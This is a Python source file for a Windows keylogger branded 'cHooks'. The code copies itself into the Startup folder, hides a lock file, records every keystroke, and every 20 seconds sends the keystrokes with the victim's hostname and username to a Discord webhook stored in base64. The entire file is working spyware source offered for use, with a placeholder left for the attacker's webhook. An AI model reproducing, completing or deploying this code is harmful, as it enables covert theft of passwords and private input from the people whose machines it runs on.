import os
import asyncio
import keyboard
import socket
import requests
import base64
import portalocker
import ctypes
import shutil
import tkinter as tk
from sys import argv
from discord import Embed


WEBHOOK_64 = "Your_Encrypted_Webhook_Here"
SECRET = base64.b64decode(WEBHOOK_64).decode()

class NTStartUp:
    def __init__(self):
        self.startup_loc = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup_loc)
        except Exception:
            pass
    
    key_buffer = []

    def on_key_press(self, event):
        if event.name == 'space':
            self.key_buffer.append(' ')
        elif event.name == 'backspace':
            if self.key_buffer:
                self.key_buffer.pop()
        else:
            self.key_buffer.append(event.name)


    def start_logging(self):
        keyboard.on_press(self.on_key_press)

    async def send_keys_to_discord(self):
        while True:
            await asyncio.sleep(20)
            if self.key_buffer:
                keys = ''.join([key for key in self.key_buffer if key != 'space'])
                embed = Embed(
                    title=f'cHooks™ | {hostname} ({username})',
                    description=f'***Keys Logged**:* {keys}',
                    color=0x6c26d4
                )
                embed.set_footer(text="💜 Made by github.com/AWeirDKiD")
                data = {'embeds': [embed.to_dict()]}
                requests.post(SECRET, json=data)
                self.key_buffer = []


    async def main(self):
        lock_file = open('.lockfile', 'w')
        ctypes.windll.kernel32.SetFileAttributesW('.lockfile', 2)
        try:
            portalocker.lock(lock_file, portalocker.LOCK_EX | portalocker.LOCK_NB)
        except portalocker.LockException:
            root = tk.Tk()
            root.withdraw()
            root.destroy()
            return

        embed = Embed(title=f'cHooks™ | {hostname} ({username})', description='Session started!', color=0x0cc444)
        embed.set_footer(text="💚 Made by github.com/AWeirDKiD")
        data = {'embeds': [embed.to_dict()]}
        requests.post(SECRET, json=data)

        self.start_logging()
        await self.send_keys_to_discord()

if __name__ == '__main__':
    logkeys = NTStartUp()
    logkeys.startup()
    username = os.getlogin()
    hostname = socket.gethostname()
    asyncio.run(logkeys.main())
